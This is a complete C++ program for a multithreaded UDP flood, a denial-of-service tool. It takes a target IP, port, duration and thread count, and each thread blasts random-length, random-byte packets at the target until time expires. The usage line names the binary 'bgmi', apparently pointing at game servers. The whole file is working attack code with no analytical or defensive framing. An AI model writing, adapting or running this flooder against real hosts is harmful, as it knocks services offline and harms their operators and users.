#include <iostream>
#include <cstdlib>
#include <cstring>
#include <arpa/inet.h>
#include <pthread.h>
#include <ctime>
#include <csignal>
#include <vector>
#include <memory>
#include <unistd.h>
#include <random>

// Global variables for remaining time and mutex
static int remaining_seconds;
static pthread_mutex_t time_mutex = PTHREAD_MUTEX_INITIALIZER;

class Attack {
public:
    Attack(const std::string& ip, int port, int duration)
        : ip(ip), port(port), duration(duration) {}

    void attack_thread() {
        int sock;
        struct sockaddr_in server_addr;
        time_t endtime = time(NULL) + duration;

        char payload[1024]; // Max random length
        memset(&server_addr, 0, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(port);
        server_addr.sin_addr.s_addr = inet_addr(ip.c_str());

        if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
            perror("Socket creation failed");
            pthread_exit(NULL);
        }

        // Random payload length for this thread (between 64–1024)
        int payload_size = 64 + rand() % (1024 - 64);
        for (int i = 0; i < payload_size; ++i)
            payload[i] = (char)(rand() % 256);

        while (time(NULL) <= endtime) {
            sendto(sock, payload, payload_size, 0,
                   (struct sockaddr *)&server_addr, sizeof(server_addr));
        }

        close(sock);
    }

private:
    std::string ip;
    int port;
    int duration;
};

void handle_sigint(int sig) {
    std::cout << "\nStopped\n";
    exit(0);
}

void usage() {
    std::cout << "Usage: ./bgmi ip port duration threads\n";
    exit(1);
}

// Thread function to print remaining time
void* monitor_time(void*) {
    while (true) {
        sleep(1); // Update every second
        pthread_mutex_lock(&time_mutex);
        if (remaining_seconds <= 0) {
            pthread_mutex_unlock(&time_mutex);
            break;
        }
        std::cout << "Time left: " << remaining_seconds << "s\r" << std::flush;
        remaining_seconds--;
        pthread_mutex_unlock(&time_mutex);
    }
    return nullptr;
}

int main(int argc, char *argv[]) {
    if (argc != 5) usage();

    std::string ip = argv[1];
    int port = std::atoi(argv[2]);
    int duration = std::atoi(argv[3]);
    int threads = std::atoi(argv[4]);

    signal(SIGINT, handle_sigint);

    // Initialize remaining time
    remaining_seconds = duration;

    std::vector<pthread_t> tids(threads);
    std::vector<std::unique_ptr<Attack>> attacks;

    std::cout << "Attacking " << ip << ":" << port
              << " for " << duration << "s with "
              << threads << " threads\n";

    // Launch attack threads
    for (int i = 0; i < threads; ++i) {
        attacks.push_back(std::make_unique<Attack>(ip, port, duration));
        if (pthread_create(&tids[i], NULL, [](void* arg) -> void* {
            static_cast<Attack*>(arg)->attack_thread();
            return nullptr;
        }, attacks[i].get())) {
            perror("Thread creation failed");
            exit(1);
        }
    }

    // Launch monitoring thread
    pthread_t monitor_tid;
    if (pthread_create(&monitor_tid, NULL, monitor_time, NULL)) {
        perror("Monitor thread creation failed");
        exit(1);
    }

    // Wait for all attack threads to finish
    for (int i = 0; i < threads; ++i)
        pthread_join(tids[i], NULL);

    // Signal monitor to stop and wait for it
    pthread_mutex_lock(&time_mutex);
    remaining_seconds = 0; // Signal to stop
    pthread_mutex_unlock(&time_mutex);
    pthread_join(monitor_tid, NULL);

    std::cout << "\nFinished.\n";
    return 0;
}

